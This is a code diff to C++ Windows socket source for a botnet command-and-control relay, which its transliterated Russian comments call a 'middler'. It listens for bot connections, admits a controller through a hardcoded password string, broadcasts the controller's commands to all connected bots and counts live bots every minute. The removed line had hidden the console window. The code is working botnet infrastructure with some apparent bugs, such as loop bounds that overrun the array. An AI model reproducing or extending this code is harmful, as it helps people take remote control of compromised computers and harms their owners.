@@ -14,11 +14,11 @@ SOCKADDR_IN addr;
 HANDLE hThread, hThreadB, hThreadC;
 DWORD IDThread;
 
-int hr;
+int hr, _ans, _col;
 
 int s = sizeof(addr);
 
-
+//Obnovlenije Vindovs SOKET API
 void Wsa()
 {
 	WSADATA wsaData;
@@ -26,7 +26,7 @@ void Wsa()
 	WSAStartup(DLLVersin, &wsaData);
 
 }
-
+//Ustanovka adressa podključenija
 void setaddr()
 {
 	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
@@ -34,6 +34,7 @@ void setaddr()
 	addr.sin_family = AF_INET;
 }
 
+//Zapusk proslušivanija podključenij
 void listen()
 {
 	sListen = socket(AF_INET, SOCK_STREAM, NULL);
@@ -41,6 +42,7 @@ void listen()
 	listen(sListen, SOMAXCONN);
 }
 
+//Funkcija rassylki komand botam
 void setn(char msg[40])
 {
 	for (int i = 0; i <= 256; i++)
@@ -60,8 +62,32 @@ void setn(char msg[40])
 	
 }
 
+//Funkcija Rassylki i polučenija otveta, dlja polučenija kol-vo dostupnyh botov
+void ans()
+{
+	_ans = 0;
+	for (int i = 0; i <= 256; i++)
+	{
+		cout << i << " =  " << "&&" << endl;
+		char msg[2] = " ";
+		string _msg;
+		cout << i << endl;
+		send(Con[i], "&&", sizeof("&&"), NULL);
+		recv(Con[i], msg, sizeof(msg), NULL);
+		_msg = msg;
+		if (_msg == "@")
+		{
+			_ans++;
+		}
+
+	}
+	cout << _ans << endl;
+	_col++;
+}
+
 DWORD WINAPI reces(LPVOID d);
 
+//Funkcija podključenija klienta i botov
 DWORD WINAPI inff(LPVOID g)
 {
 
@@ -81,6 +107,7 @@ DWORD WINAPI inff(LPVOID g)
 		recv(sock, msg2, sizeof(msg2), NULL);
 		//memcpy(gg, msg2, sizeof(msg2));
 		gg = msg2;
+		//Podključenie klienta
 		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
 		{
 			Cli = sock;
@@ -93,18 +120,22 @@ DWORD WINAPI inff(LPVOID g)
 			cout << "Bot" << d << " connected to middler." << endl;
 			
 		}
-		if (d == 256) { d = 0; }
+		if (d == 10) { d = 0; }
 		
 	}
 
 	return 0;
 }
-
+//Polučenie soobscenija ot klienta i rassylka ego botam ili vypolnenie funkcij samogo middlera
 DWORD WINAPI reces(LPVOID d)
 {
 	int iResult(0);
 	t7:
 	char msg [40] = "Ready to new command";
+	if (send(Cli, msg, sizeof(msg), NULL) == SOCKET_ERROR)
+	{
+		cout << "Sent to Client failed" << endl;
+	}
 	string m;
 	cout << msg << endl;
 	iResult = recv(Cli, msg, sizeof(msg), NULL);
@@ -123,6 +154,27 @@ DWORD WINAPI reces(LPVOID d)
 	else
 	{
 		m = msg;
+		if (m == "middler")
+		{
+				char msg [40] = "Middler is here!";
+				cout << msg << endl;
+				if (send(Cli, msg, sizeof(msg), NULL) == SOCKET_ERROR)
+				{
+					cout << "Sent to Client failed" << endl;
+				}
+				Sleep(1000);
+				goto t7;
+		}
+		if (m == "bots")
+		{
+			cout << "bots -> " << _ans << endl;
+			goto t7;
+		}
+		if (m == "col")
+		{
+			cout << "col =" << _col << endl;
+			setn(msg);
+		}
 		if (m != "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j" || m != "m")
 		{
 			setn(msg);
@@ -132,20 +184,32 @@ DWORD WINAPI reces(LPVOID d)
 
 	return 0;
 }
-
+//Potok proverki svobodnyh botov každuju minutu
+DWORD WINAPI _ans_(LPVOID g)
+{
+	while (true)
+	{
+		Sleep(60000);
+		ans();
+	}
+	return 0;
+}
+//Očevidno, čto main 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
 
 
 	Wsa();
 	setaddr();
 	listen();
 	hThread = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);
+	hThreadC = CreateThread(NULL, NULL, _ans_, NULL, NULL, &IDThread);
 
 	
 	WaitForSingleObject(hThread, INFINITE);
 	WaitForSingleObject(hThreadB, INFINITE);
+	WaitForSingleObject(hThreadC, INFINITE);
 
 	return 0;
 }
